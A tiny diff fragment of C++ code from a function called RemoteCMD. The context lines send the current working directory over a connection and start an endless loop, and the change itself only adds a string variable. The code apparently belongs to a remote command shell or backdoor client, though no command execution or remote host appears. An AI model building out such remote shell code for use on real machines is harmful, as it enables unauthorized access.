@@ -2,6 +2,7 @@ void RemoteCMD()
 {
     send(getcwd(buffer, FILENAME_MAX));
     FILE* stream;
+    std::string data;
 
     while (true)
     {
